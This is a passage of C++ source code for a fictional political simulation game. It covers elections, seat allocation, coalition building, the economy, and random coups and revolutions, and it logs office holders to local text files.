    {""National Stability Directorate"",""National Security Council"",""Order Maintenance Committee"",""Defense Authority Council"",""Sovereignty Guardianship Council"",""Military Oversight Committee"",""National Harmony Command"",""Authority Preservation Council"",""Unity and Defense Directorate"",""Strategic Leadership Council""}
    };

string par_name[7] = {""Republican Democracy Party - L"", ""Republican Democracy Party - P"", ""Republican Democracy Party - M"", ""Republican Democracy Party - R"", ""Republican Democracy Party - N"", ""National Development Corp"", ""Vacant""};
string par_acro[7] ={""Leftists"", ""Populists"", ""Moderates"", ""Rightists"", ""Nationalists"", ""Military"", ""Vacant""};
int par_coal[5];
float par_seats[5];
int par_seats_int[5];

int friendly[6];

string flags[13] = {""Economic Redistribution"", ""Labor Rights Empowerment"", ""Social Welfare Expansion"", ""Education Reform"", ""Market Regulation"", ""Immigration Management"", ""Foreign Relations Diplomacy"", ""Cultural Heritage Preservation"", ""Strong National Defense"", ""Identity-Based Citizenship"", ""Environmental Protection"", ""National Security Enhancement"", ""Ethnic and National Exclusivity""};

int minumpol = 7;

int pflags[5];


int prevseats[5] = {0,0,0,0,0};


int splural = 0;
int startyear = 1950;
bool isnew[5] = {true,true,true,true,true};

int military = 80;
int milfav = 4, milenem =0;
int milyear = startyear;

int intervals = 2;
int inyear = startyear;

string userinput ="""";

int prevtot =0;
int policy;
float pfloat = 0.50;
int year = startyear;
int trendyear = startyear;
int lhgains[5] = {0,0,0,0,0};

int militancy = 50;

int prevpercent[5] = {0,0,0,0,0};

bool fair = true;

int presyear =startyear, premyear = startyear;

string cannames[8];
string pcannames[7] = {"""","""","""","""","""","""",""""};
int pcanyear[5] = {startyear,startyear,startyear,startyear,startyear};
int canyear[5] = {startyear,startyear,startyear,startyear,startyear};

string prevpres = """", prevprem = """";

string presprename, premprename;

string pname, pmname;

string president, primeminister, opposition;

int trending =2;

float par_votes[5] = {25,25,25,25,25};
int par_votes_int[5];

float par_percent[5];
int par_percent_int[5];

float popularity[5] = {20,20,20,20,20};

int totalvotes =0;

int tvts =0;

int people =100;
int pefav = trending, penem = 4;
int peyear = startyear; // note: create a people's revolution mechanic

int seats = 50;
int seatcheck;

int presidentnum =6;
int pres_votes =0;

int juntayear = startyear-8;

int primeministernum =6;

int oppositionnum =6;

int govmembers=0;
int gmem[5];
int govseats;
int govper;

int plurality;
int pluralvotes;

int oppomembers =0;
int omem[5];
int opposeats;
int oppoper;

int indepmembers =0;
int imem[5];
int indepseats =0;
int indeper;

int p_auth[7] = {0,0,0,0,0};
// -5 to 5

int totauth = 50; // higher, less authoritarian, lower more authoritarian
// -100 to 100

int av_correspond =0; // this integer will correspond to the ""i"" integer use din the for loop for adding votes

bool midterm = false;

bool junta = false;

bool ot =false;
int countdown = startyear;

int economy = 40; // only goes 1 to 100
int competence[5] = {2,3,4,3,2};
int BBC = 5;
bool boom = true;
int shiffty;

void mupdate()
{
    militancy += p_auth[presidentnum];
    militancy += totauth/10;
    militancy += people/10;
    militancy -= (year - presyear)/10;

    if(militancy > 100)
    {
        militancy =100;
    }
    if(militancy < -100)
    {
        militancy = -100;
    }
}

void updateauth()
{
    float auadd = (float) p_auth[presidentnum]*(popularity[presidentnum] + (par_seats[presidentnum]/seats));
    totauth += p_auth[presidentnum];
    totauth += militancy/10;
    //totauth += auadd;
    if(totauth > 100)
    {
        totauth = 100;
    } else if(totauth < -100)
    {
        totauth = -100;
    }
}

void bbcupdate()
{
    if(boom)
    {
        BBC++;
    } else
    {
        BBC--;
    }
    if(BBC >= shiffty)
    {
        BBC--;
        boom = false;
    }
    if(BBC <= shiffty-(shiffty*2))
    {
        shiffty = (rand()%3)*5;
        BBC++;
        boom = true;
    }

    if(boom == false)
    {
        if(rand()%10 < competence[presidentnum]/2)
        {
            boom = true;
            shiffty = (rand()%3)*5;
        }
    } else if(boom == true)
    {
        if( rand()%10 > competence[presidentnum]*2)
        {
            boom = false;
        }
    }
}

void shiftcomp(int k)
{
    if(rand()%10 <5)
    {
        competence[k]++;
    } else
    {
        competence[k]--;
    }
    if(competence[k] > 10)
    {
        competence[k] = 10;
    }
    if(competence[k] < 1)
    {
        competence[k] = 1;
    }
}

void ecupdate()
{
    float bonus;
    switch(competence[presidentnum])
    {
    case 1:bonus = 0.01;
        break;
    case 2:bonus = 0.03;
        break;
    case 3:bonus = 0.05;
        break;
    case 4:bonus = 0.1;
        break;
    case 5:bonus = 0.15;
        break;
    case 6:bonus = 0.2;
        break;
    case 7:bonus = 0.25;
        break;
    case 8: bonus = 0.3;
        break;
    case 9: bonus = 0.4;
        break;
    case 10: bonus = 0.5;
        break;
    default:
        bonus = 0.6;
        break;
    }

    switch(people/10)
    {
    case 1:bonus += -0.25;
        break;
    case 2:bonus += -0.2;
        break;
    case 3:bonus +=  -0.15;
        break;
    case 4:bonus += -0.1;
        break;
    case 5:bonus += -0.05;
        break;
    case 6:bonus += 0.05;
        break;
    case 7:bonus += 0.1;
        break;
    case 8: bonus += 0.15;
        break;
    case 9: bonus += 0.2;
        break;
    case 10: bonus += 0.25;
        break;
    default:
        if(people < 0)
        {
            bonus += -0.3;
        }else
        {
            bonus = 0.3;
        }
    }
    float BBChange = (float) BBC/100;
    bonus += BBChange;
    economy += economy*bonus;
    int downturn = rand()%10;
    economy -= downturn;
    economy += militancy/10;
    if(economy > 100)
    {
        economy = 100;
    }
    if(economy < -100)
    {
        economy = -100;
    }
}

void indivgen(int k)
{
    string consonant[20] = {""B"",""B"",""K"",""D"",""G"",""H"",""H"",""L"",""L"",""M"",""N"",""P"",""R"",""S"",""S"",""T"",""T"",""W"",""W"",""Y""};
    string vowel[13] = {""A"",""A"",""A"",""A"",""A"",""E"",""I"",""I"",""I"",""O"",""O"",""O"",""U""};
    string aftercon[11] = {""NG"",""NG"",""M"",""M"",""N"",""K"",""K"",""P"",""P"",""T"",""Y""};

    string bloc1,bloc2, bloc3;
    string fname, lname;
    bloc1 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc1 += aftercon[rand()%11];
        }
        bloc2 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc2 += aftercon[rand()%11];
        }
        bloc3 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc3 += aftercon[rand()%11];
        }

        fname = bloc1 + bloc2;
        if(rand()%10 < 5)
        {
            fname += bloc3;
        }



        bloc1 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc1 += aftercon[rand()%11];
        }
        bloc2 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc2 += aftercon[rand()%11];
        }
        bloc3 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc3 += aftercon[rand()%11];
        }

        lname = bloc1 + bloc2;
        if(rand()%10 < 5)
        {
            lname += bloc3;
        }
        cannames[k] = fname + "" "" + lname;


}

void pmindivgen(int k)
{
    string consonant[20] = {""B"",""B"",""K"",""D"",""G"",""H"",""H"",""L"",""L"",""M"",""N"",""P"",""R"",""S"",""S"",""T"",""T"",""W"",""W"",""Y""};
    string vowel[13] = {""A"",""A"",""A"",""A"",""A"",""E"",""I"",""I"",""I"",""O"",""O"",""O"",""U""};
    string aftercon[11] = {""NG"",""NG"",""M"",""M"",""N"",""K"",""K"",""P"",""P"",""T"",""Y""};

    string bloc1,bloc2, bloc3;
    string fname, lname;
    bloc1 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc1 += aftercon[rand()%11];
        }
        bloc2 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc2 += aftercon[rand()%11];
        }
        bloc3 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc3 += aftercon[rand()%11];
        }

        fname = bloc1 + bloc2;
        if(rand()%10 < 5)
        {
            fname += bloc3;
        }



        bloc1 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc1 += aftercon[rand()%11];
        }
        bloc2 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc2 += aftercon[rand()%11];
        }
        bloc3 = consonant[rand()%20] + vowel[rand()%13];
        if(rand()%10 < 3)
        {
            bloc3 += aftercon[rand()%11];
        }

        lname = bloc1 + bloc2;
        if(rand()%10 < 5)
        {
            lname += bloc3;
        }
        pcannames[k] = fname + "" "" + lname;


}

void pecheck()
{
    if(presidentnum == pefav)
    {
        people += 10;
    } else if(presidentnum == penem)
    {
        people -= 10;
    } else
    {
        if(presidentnum > pefav)
        {
            people -= presidentnum - pefav;
        } else
        {
            people -=  pefav -presidentnum;
        }

        if(presidentnum > penem)
        {
            people += presidentnum - penem;
        } else
        {
            people +=  penem -presidentnum;
        }
    }

    if(fair == false)
    {
        people -= year-presyear;
    }

    if(pefav == oppositionnum)
    {
        people -= 5;
    }
    if(penem == primeministernum)
    {
        people -= 5;
    }
    if(pefav == primeministernum)
    {
        people += 5;
    }

    people -= par_percent_int[penem]/2;
    people += par_percent_int[pefav]/2;
    people += economy/10;
    people += totauth/10;
    people += militancy/10;

    if(fair == false)
    {
        people -= year - presyear;
    }

    if(people > 100 && presidentnum == pefav)
    {
        people = 100;
    } else if (people > 40 && presidentnum == penem)
    {
        people = 40;
    } else if (people > 70 && presidentnum != pefav && presidentnum != penem)
    {
        people = 70;
    }

    if(people < -200)
    {
        people = -200;
    }
}

void pshift()
{

        switch(rand()%10)
        {
        case 1:
        case 2:
            penem++;
            break;
        case 9:
        case 8:
            penem --;
            break;
        default:
            break;
        }
    if(penem > 4)
    {
        penem = 4;
    }
    if(penem < 0)
    {
        penem  =0;
    }
    if(penem == pefav)
    {
        penem = rand()%4;
    }
}

void revcheck()
{
    if(rand()%20 < year - peyear)
    {
        if(people < -25 && rand()%20 > (people + par_percent_int[presidentnum])-intervals && militancy < -10)
        {
            intervals =0;
            peyear = year;
            ofstream presfile;
        presfile.open(""Presidents.txt"", fstream::app);
        presfile << presprename << "" ("" << prevpres << "") "" << presyear << "" - "" << year << "" (REVOLT)"" << endl;
        presfile.close();
        presyear = year;
        prevpres = par_name[presidentnum];
        presprename = cannames[presidentnum];


        ofstream pmfile;
        pmfile.open(""Premieres.txt"", fstream::app);
        pmfile << premprename << "" ("" << prevprem << "") "" << premyear << "" - "" << year  << "" (REVOLT)""<< endl;
        pmfile.close();
        premyear = year;
        prevprem = par_name[primeministernum];
        premprename = cannames[primeministernum];
        economy -= (rand()%5)*5;
        if(presidentnum == milfav)
        {
            military -=50;
        } else if(presidentnum == milenem)
        {
            military += 25;
        } else
        {
            military -=30;
        }
        totauth += rand()%200;

        intervals = 0;
        ot = true;
        militancy += rand()%200;
            presidentnum = pefav;
            oppositionnum = penem;
            president = par_name[pefav];
            opposition = par_name[oppositionnum];
            presyear = year;
            pname = cannames[pefav];

            primeministernum = 6;
            primeminister = ""VACANT"";
            premyear = year;
            pmname = ""VACANT"";
            fair = true;
            junta = false;
            midterm = false;
            people =99;
            cout << ""REVOLUTION!"" << endl;
            sleep(1);
        }else if(people < -10 && rand()%100 < military)
        {
            people += rand()%200;
            militancy += rand()%200;
            cout << ""REVOLUTION FAILED"" << endl;
            sleep(1);
        }
    }
}

void mchange()
{
    if((rand()%year-startyear)+1 < year - milyear)
    {
        milyear = year;
        int k = rand()%10;
        if(presidentnum != milfav)
        {
            if(milfav > 2)
        {
            switch(k)
        {
        case 1:
        case 2:
            milfav++;
            break;
        case 10:
        case 9:
            milfav--;
            break;
        default:
            break;
        }
        if(milfav > 4)
        {
            milfav =4;
        } else if( milfav < 0)
        {
            milfav = 0;
        }
        } else if(milfav <=3)
        {

            switch(k)
        {
        case 1:
        case 2:
        case 3:
        case 4:
            milfav++;
            break;
        case 10:
            milfav--;
            break;
        default:
            break;
        }
        if(milfav > 4)
        {
            milfav =4;
        } else if( milfav < 0)
        {
            milfav = 0;
        }

        }
        } else
        {

            if(milfav > 2)
        {
            switch(k)
        {
        case 1:
            milfav++;
            break;
        case 10:
            milfav--;
            break;
        default:
            break;
        }
        if(milfav > 4)
        {
            milfav =4;
        } else if( milfav < 0)
        {
            milfav = 0;
        }
        } else if(milfav <=3)
        {

            switch(k)
        {
        case 1:
        case 2:
            milfav++;
            break;
        case 10:
            milfav--;
            break;
        default:
            break;
        }
        if(milfav > 4)
        {
            milfav =4;
        } else if( milfav < 0)
        {
            milfav = 0;
        }

        }



        }



        k = rand()%10;

        if(milenem <=3)
        {

            switch(k)
        {
        case 1:
        case 2:
            milenem++;
            break;
        case 10:
        case 9:
        milenem--;
        break;
        default:
            break;
        }

        } else if(milenem > 3)
        {

            switch(k)
        {
        case 1:
        case 2:
        case 3:
        case 4:
            milenem--;
            break;
        case 10:
        milenem++;
        break;
        default:
            break;
        }

        }


        for(int i=0; i!= oppomembers; i++)
        {
            if(milfav == omem[i])
            {
                military -=5;
            }
            if(milenem == omem[i])
            {
                military +=5;
            }
        }

        for(int i=0; i!= govmembers; i++)
        {
            if(milfav == gmem[i])
            {
                military +=5;
            }
            if(milenem == gmem[i])
            {
                military -=5;
            }
        }

        if(milenem > 4)
        {
            milenem =4;
        } else if( milenem < 0)
        {
            milenem = 0;
        }

        while(milenem == milfav)
        {
            milenem = rand()%4;
        }
    }
    par_name[5] = allparties[5][rand()%3];
}

void covalues()
{
    if(presidentnum == milfav)
    {
        military += 10;
    }else if(presidentnum == milenem)
    {
        military -= 10;
    }else
    {
        if(presidentnum < milenem)
        {
            military += milenem - presidentnum;
        } else
        {
            military += presidentnum - milenem;
        }

        if(presidentnum < milfav)
        {
            military -= milfav - presidentnum;
        }else
        {
            military -= presidentnum - milfav;
        }
    }

    if(primeministernum == milfav)
    {
        military += 5;
    } else if(primeministernum == milenem)
    {
        military -= 5;
    }

    if(oppositionnum == milfav)
    {
        military -= 20;
    }
    if(fair == false)
    {
        military -= year- presyear;
    }
    if(military > 100 && presidentnum == milfav)
    {
        military = 100;
    } else if (military > 40 && presidentnum == milenem)
    {
        military = 40;
    } else if (military > 70 && presidentnum != milfav && presidentnum != milenem)
    {
        military = 70;
    }
    if(military < -100)
    {
        military =-100;
    }
    military += economy/10;
    military-= totauth/10;
    military += (int) (par_seats[milfav] / seats)*100;
    military -= (int) (par_seats[milenem] / seats)*100;
}

void coupcheck()
{
    // coup factor = term length(year - presyear)

    if(rand()%8 < year - juntayear && junta == false)
    {

        int supportfactor = (int)(par_percent_int[presidentnum]/10 + ((par_seats[presidentnum] / seats)*100) + military) - (year-presyear);
        int sfcheck = rand()%50;
        sfcheck = sfcheck - (sfcheck*2);
        if(sfcheck > supportfactor-intervals)
        {
            intervals = 0;
            junta = true;
        ot = true;
        juntayear = year;
            ofstream presfile;
        presfile.open(""Presidents.txt"", fstream::app);
        presfile << presprename << "" ("" << prevpres << "") "" << presyear << "" - "" << year << "" (COUP)"" << endl;
        presfile.close();
        presyear = year;
        prevpres = par_name[presidentnum];
        presprename = cannames[presidentnum];


        ofstream pmfile;
        pmfile.open(""Premieres.txt"", fstream::app);
        pmfile << premprename << "" ("" << prevprem << "") "" << premyear << "" - "" << year  << "" (COUP)""<< endl;
        pmfile.close();
        premyear = year;
        prevprem = par_name[primeministernum];
        premprename = cannames[primeministernum];


        economy -= (rand()%5)*5;
        if(presidentnum == pefav)
        {
            people -=50;
        } else if(presidentnum == penem)
        {
            people += 25;
        } else
        {
            people -=30;
        }
        totauth -= rand()%200;
        militancy -= rand()%200;
        intervals = 0;
            presidentnum = milfav;
            oppositionnum = milenem;
            president = par_name[presidentnum];
            opposition = par_name[oppositionnum];
            presyear = year;
            pname = cannames[milfav];
            p_auth[presidentnum] = -10;

            primeministernum = 6;
            primeminister = ""VACANT"";
            premyear = year;
            pmname = ""VACANT"";
            fair = false;
            midterm = false;
            military =99;
            cout << ""MILITARY COUP!"" << endl;
            sleep(1);
        } else if(military < -10 && rand()%100 < people)
        {
            military += rand()%200;
            militancy += rand()%200;
            cout << ""COUP ATTEMPT FAILED"" << endl;
            sleep(1);
        }
    }
}

void countplural()
{
    pluralvotes = 0;
    for(int i=0; i!=5; i++)
    {
        if(par_votes_int[i] > pluralvotes)
        {
            plurality =i;
            pluralvotes = par_votes_int[i];
        }
    }
}

void dsdhondt()
{
    int winr = 6;
    int winnum =0;
    int vcomp[6];
    int counts[6]= {0,0,0,0,0};
    vcomp[5] =0;
    for(int i=0; i!=5; i++)
    {
        vcomp[i] = par_votes_int[i];
    }

    for(int i=0; i< seats*pfloat;i++)
    {
        //cout << ""A"";
        for(int j=0; j!=5; j++)
        {
            //cout << ""B"";
            if(vcomp[j] > winnum)
            {
                winr = j;
                winnum = vcomp[j];
            }
        }
        /*for(int f=0; f!=5; f++)
        {
            cout << par_name[f] << "" "" << counts[f]+1 << "" "" << vcomp[f] << "" "";
            if(f == winr)
            {
                cout << ""+"" << endl;
            }else
            {
                cout <<  endl;
            }

        }*/
        counts[winr]++;
        vcomp[winr] = par_votes_int[winr]/(counts[winr]+1);
        par_seats[winr]++;
        par_seats_int[winr]++;

        if(vcomp[winr] == 0)
        {
            for(int c=0; c!=5; c++)
            {
                vcomp[c] = par_votes_int[c];
            }
        }

        winnum =0;
        winr =6;
        //sleep(1);
        //system(""CLS"");
    }

    for(int i=0; i!=5; i++)
    {
        lhgains[i] = par_seats_int[i];
    }
}

void discont()
{
    srand(time(NULL));
    int order[5] = {0,0,0,0,0};
    int oper[5] = {0,0,0,0,0};

    for(int i=0; i!=5; i++)
    {
        oper[i] = par_percent_int[i];
        order[i] = i;
    }

    for(int i=0; i!=5; i++)
    {
        if(i == presidentnum && midterm == true)
        {
            oper[i] += 5;
        } else if(i == plurality && midterm == false)
        {
            oper[i] += 15;
        } else if(i == presidentnum && midterm == false)
        {
            oper[i] += 5;
        } else if(i == plurality && midterm == true)
        {
            oper[i] += 10;
        }

        if(i == presidentnum)
        {
            oper[i] +=10;
        }
        if(i == primeministernum)
        {
            oper[i] += 5;
        }
        if( i == oppositionnum)
        {
            oper[i] += 5;
        }
        if(i == trending)
        {
            oper[i] += 7;
        }
        if(i == presidentnum)
        {
            oper[i] -= year-presyear;
        }
        if(plurality != presidentnum && i == plurality)
    {
        oper[i] += par_percent_int[plurality] - par_percent_int[presidentnum];
    }
    }

    int k =0;

    /*if(year == startyear)
    {
        policy = ((rand()%13) *5)+35;
        pfloat = (float) policy/100;
    }*/

    for(int c=0; c< round(seats*pfloat); c++)
    {
        for(int f=0; f!=5; f++)
        {
            k = rand()%100;
                if(k < oper[f])
                {
                    par_seats[order[f]]++;
                    par_seats_int[order[f]]++;
                    break;
                }
        }

    }

    for(int i=0; i!=5; i++)
    {
        lhgains[i] = par_seats_int[i];
    }

}

void calsplu()
{
    int winer = 1;
    for(int i=0; i!=5; i++)
    {
        if(par_seats_int[i] > winer)
        {
            splural = i;
            winer = par_seats_int[i];
        }
    }
}

int add_votes()
{
    srand(time(NULL));
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    float advote =0;
    int event = rand()%5;
    if(av_correspond == presidentnum){
        switch(event)
        {
        case 3:
            advote += (rand()%totalvotes) *1.5;
        case 4:
            case 5:
            advote += (rand()%totalvotes) *1.25;
            break;
        default:
            advote += (rand()%totalvotes) * 0.25;
        }
    }
    if(av_correspond == primeministernum) {
        switch(event)
        {
        case 1:
            if(primeministernum == oppositionnum)
            {
                advote += (rand()%totalvotes) * 0.95;
            }else
            {
                advote += (rand()%totalvotes)*1.10;
            }
            break;
        case 2:
            if(primeministernum == oppositionnum)
            {
                advote += (rand()%totalvotes) * 0.5;
            }else
            {
                advote += (rand()%totalvotes)*1.30;
            }
        case 3:
            case 4:
                if(primeministernum == oppositionnum)
            {
                advote += (rand()%totalvotes) * 0.25;
            }else
            {
                advote += (rand()%totalvotes)*0.5;
            }
            break;
        default:
            if(primeministernum == oppositionnum)
            {
                advote += (rand()%totalvotes) * 0.05;
            }else
            {
                advote += (rand()%totalvotes) * 0.10;
            }
        }
    }
    if(av_correspond == oppositionnum){
        switch(event)
        {
        case 1:
            if(primeministernum == oppositionnum)
            {
                advote += (rand()%totalvotes) * 1.10;
            }else
            {
                advote += (rand()%totalvotes) *1.75;
            }
        case 2:
        case 3:
            if(primeministernum == oppositionnum)
            {
                advote += (rand()%totalvotes) * 0.5;
            } else
            {
                advote += (rand()%totalvotes) *1.10;
            }
            break;
        default:
            if(primeministernum == oppositionnum)
            {
                advote += (rand()%totalvotes) * 0.10;
            }else
            {
                advote += (rand()%totalvotes) * 0.5;
            }
        }
    }
    int kal = rand()%100;
    if(kal >50)
    {
        advote += (rand()%totalvotes)/100;
    } else if(kal <50 && kal >30)
    {
        advote += (rand()%totalvotes)/50;
    } else if( kal < 30 && kal > 10)
    {
        advote += (rand()%totalvotes)/20;
    } else if(kal <10 && kal >3)
    {
        advote += rand()%totalvotes;
    } else
    {
        advote += (rand()%totalvotes)*2;
    }

    advote += advote * (popularity[av_correspond] /100);

    if(fair == false)
    {
        if(av_correspond == presidentnum)
        {
            advote = advote*2;
            if(junta == true)
            {
                advote += advote * 3;
            }
        }else
        {
            advote = advote /5;
        }

    }

    float paut = p_auth[av_correspond]/50;

    advote += advote*paut;

    if(junta == true && av_correspond == milfav)
    {
        advote = advote *3;
    }

    if(junta == true && av_correspond == milenem)
    {
        advote = advote*0.15;
    }

    if(trending == av_correspond && junta == false)
    {
        advote = advote *1.75;
    }

    float fly = (friendly[av_correspond]+10)/100;
    advote += advote*fly;
    if(av_correspond == presidentnum)
    {
        float age = (year-presyear) /10;
        if(age <1)
        {
            age =1;
        }
        advote = advote /age;
    }

    int aconvert = (int) advote;


    return aconvert;
}

void count_total()
{
    totalvotes =0;
    for(int i=0; i!=5; i++)
    {
        par_votes_int[i] = (int) par_votes[i];
        totalvotes += par_votes_int[i];
    }
}

void oppoprimaries()
{
    int wvotes =0;
    if(par_seats_int[oppositionnum] == 0)
    {
        for(int i=0; i!=oppomembers; i++)
    {
        if(par_seats_int[omem[i]] > wvotes)
        {
            oppositionnum =omem[i];
            wvotes = par_seats_int[omem[i]];
        }
    }

    }
    if(rand()%seats > par_seats_int[oppositionnum])
    {
        for(int i=0; i!=oppomembers; i++)
    {
        if(par_seats_int[omem[i]] > wvotes)
        {
            oppositionnum =omem[i];
            wvotes = par_seats_int[omem[i]];
        }
    }
    }
}

void vcalc()
{
    for(int i=0; i!=5; i++)
    {
        par_percent[i] = (par_votes[i] / totalvotes);
        par_percent_int[i] = (int)(par_percent[i]*100);
    }
}

float tseats =0;
float remaining =0;

void seatcalc()
{
    tseats =0;
    seatcheck =0;
    for(int i=0; i!=5; i++)
    {
        tseats += par_seats[i];
    }
    remaining =0;
    remaining = seats-tseats;
    for(int i=0; i!=5; i++)
    {
        par_seats[i] += round(remaining * par_percent[i]);
        par_seats_int[i] = (int) par_seats[i];
    }
}

void prescalc()
{
    int loservotes =1;
    pres_votes =1;
    for(int i=0; i!=5; i++)
    {
        if(par_votes_int[i] > pres_votes)
        {
            presidentnum = i;
            pres_votes = par_votes_int[i];
        }
    }
    for(int i=0; i!=5; i++)
    {
        if(par_votes_int[i] < pres_votes && par_votes_int[i] > loservotes)
        {
            oppositionnum =i;
            loservotes = par_votes_int[i];
        }
    }


    gmem[govmembers] = presidentnum;
    govseats += par_seats_int[presidentnum];
    govper += par_percent_int[presidentnum];
    govmembers++;
    if(pres_votes >= (totalvotes/2))
    {
        cout << cannames[presidentnum] << "" ("" << par_name[presidentnum] << "") has won the Presidency by a Majority!"" << endl;
    } else
    {
        cout << cannames[presidentnum] << "" ("" << par_name[presidentnum] << "") has won the Presidency by a Plurality!"" << endl;
    }
    if(cannames[presidentnum] != presprename && junta == false)
    {
        ofstream presfile;
        presfile.open(""Presidents.txt"", fstream::app);
        presfile << presprename << "" ("" << prevpres << "") "" << presyear << "" - "" << year << endl;
        presfile.close();
        presyear = year;
        prevpres = par_name[presidentnum];
        presprename = cannames[presidentnum];
    }
    if( cannames[presidentnum] != presprename && junta == true && ot == true)
    {
        ot = false;
        ofstream presfile;
        presfile.open(""Presidents.txt"", fstream::app);
        presfile << par_name[5] << "" "" << presyear << "" - "" << year << endl;
        presfile.close();
        presyear = year;
        prevpres = par_name[presidentnum];
        presprename = cannames[presidentnum];
    } else if( cannames[presidentnum] != presprename && junta == true && ot == false)
    {
        ofstream presfile;
        presfile.open(""Presidents.txt"", fstream::app);
        presfile << presprename << "" ("" << prevpres << "") "" << presyear << "" - "" << year << endl;
        presfile.close();
        presyear = year;
        prevpres = par_name[presidentnum];
        presprename = cannames[presidentnum];
    }
    pname = cannames[presidentnum];
}

void coalitionform()
{


    oppomembers =0;
    omem[oppomembers] = 0;
    opposition = """";
    opposeats += 0;
    oppoper += 0;

    opposition = par_name[oppositionnum];
    omem[oppomembers] = oppositionnum;
    opposeats += par_seats_int[oppositionnum];
    oppoper += par_percent_int[oppositionnum];
    oppomembers++;

    int gchance =0;
    int ochance =0;

    gchance = par_percent_int[presidentnum]/2;
    ochance = par_percent_int[oppositionnum]/2;
    int ichance = 10;

    //cout << ""Prepared Variables"" << endl;

    for(int i=0; i!=5; i++)
    {
        gchance = par_percent_int[presidentnum]/2;
    ochance = par_percent_int[oppositionnum]/2;
    ichance = ((gchance+ochance)*0.05)+1;
        if(i != presidentnum && i!= oppositionnum)
        {
            if(presidentnum > i)
            {
                ochance += (presidentnum - i)*5;
            } else
            {
                ochance += (i-presidentnum)*5;
            }

            if(oppositionnum > i)
            {
                gchance += (oppositionnum - i)*5;
            } else
            {
                gchance += (i-oppositionnum)*5;
            }


            if(pflags[i] == pflags[presidentnum])
            {
                if(presidentnum > i)
                {
                    gchance += (presidentnum - i)*5;
                } else
                {
                    gchance += (i-presidentnum)*5;
                }
            } else if(pflags[i] == pflags[oppositionnum])
            {
                if(oppositionnum > i)
                {
                    gchance += (oppositionnum - i)*5;
                } else
                {
                    gchance += (i-oppositionnum)*5;
                }
            } else
            {
                if(pflags[i] > pflags[presidentnum])
                {
                    ochance = (pflags[i] - pflags[presidentnum])*2;
                } else
                {
                    ochance = (pflags[presidentnum] - pflags[i])*2;
                }

                if(pflags[i] > pflags[oppositionnum])
                {
                    gchance = (pflags[i] - pflags[oppositionnum])*2;
                } else
                {
                    gchance = (pflags[oppositionnum] - pflags[i])*2;
                }
            }
            gchance += friendly[presidentnum]*2;
            ochance += friendly[oppositionnum]*2;
            //cout << ""Finished Manipulating Chances"" << endl;
            // coalition chance
            /*long long ccer =0;
            long long totalChance = ochance + gchance + ichance;

            if (totalChance <= RAND_MAX) {
                ccer = (rand() % totalChance) + 1;
            } else
            {
                totalChance/=10;
                ccer = (rand() % totalChance) + 1;
            }

            ccer = (rand()%(ochance + gchance + ichance))+1;*/

            int tchan = (ochance + gchance + ichance)+1;
            float ocp = (ochance / static_cast<float>(tchan)) * 100;
            float gcp = (gchance / static_cast<float>(tchan)) * 100;
            float icp = (ichance / static_cast<float>(tchan)) * 100;

            int evt = rand()%100;
            //cout << ""Generated Random Number"" << endl;
            if(evt >= ocp+icp)
            {
                gmem[govmembers] = i;
                govseats += par_seats_int[i];
                govper += par_percent_int[i];
                govmembers++;
            } else if(evt < ocp && evt > icp)
            {
                omem[oppomembers] =i;
                opposeats += par_seats_int[i];
                oppoper += par_percent_int[i];
                oppomembers++;
            } else
            {
                imem[indepmembers] =i;
                indepseats += par_seats_int[i];
                indeper += par_percent_int[i];
                indepmembers++;
            }

            //cout << ""Finished Deciding Coalitions"" << endl;
        }
    }
    if(oppositionnum == presidentnum)
    {
        oppositionnum = omem[rand()%oppomembers];
    }
}


void pmcalc()
{
    float goseats = (float) govseats, opseats = (float) opposeats, inseats = (float) indepseats;
    goseats = (goseats/seats)*100;
    opseats = (opseats/seats)*100;
    inseats = (inseats/seats)*100;
    govper = (int) goseats;
    oppoper = (int) opseats;
    indeper = (int) inseats;
    bool hasfoundpm = false;
    int gplu =0;

    if(govseats > opposeats && indepseats < seats/2)
    {
        cout << ""The Ruling Party has secured a majority in parliament"" << endl;
        if(rand()%seats < par_seats_int[presidentnum])
        {
            primeministernum = presidentnum;
        } else
        {
            primeministernum = gmem[rand()%govmembers];
        }
        cout << pcannames[primeministernum] << ""("" << par_name[primeministernum] << "") has been appointed Prime Minister"" << endl;

    } else
    {
        if(indepseats >= govseats + opposeats)
        {
            cout << ""A majority in parliament has declared a boycott. \nSnap elections have been scheduled later this year"" << endl;
            midterm = false;
        intervals = 0;
        primeministernum = 6;
        } else if(opposeats >= govseats)
        {
            cout << ""The Ruling Party has failed to secure a majority in parliament.\nSnap elections have been scheduled later this year"" << endl;
        midterm = false;
        intervals = 0;
        primeministernum = 6;
        }

    }


    if(oppomembers == 0)
    {
        oppositionnum = 7;
        opposition = """";
    }

    pmname = pcannames[primeministernum];

    if(cannames[primeministernum] != premprename && junta == false)
    {
        ofstream pmfile;
        pmfile.open(""Premieres.txt"", fstream::app);
        pmfile << premprename << "" ("" << prevprem << "") "" << premyear << "" - "" << year << endl;
        pmfile.close();
        premyear = year;
        prevprem =par_name[primeministernum];
        premprename = cannames[primeministernum];
    }
    if( cannames[primeministernum] != premprename && junta == true && ot == true)
    {
        ot = false;
        ofstream pmfile;
        pmfile.open(""Premieres.txt"", fstream::app);
        pmfile << premprename << "" ("" << par_name[5] << "") "" << premyear << "" - "" << year << endl;
        pmfile.close();
        premyear = year;
        prevprem =par_name[primeministernum];
        premprename = cannames[primeministernum];
    } else if( cannames[primeministernum] != premprename && junta == true && ot == false)
    {
        ofstream pmfile;
        pmfile.open(""Premieres.txt"", fstream::app);
        pmfile << premprename << "" ("" << prevprem << "") "" << premyear << "" - "" << year << endl;
        pmfile.close();
        premyear = year;
        prevprem =par_name[primeministernum];
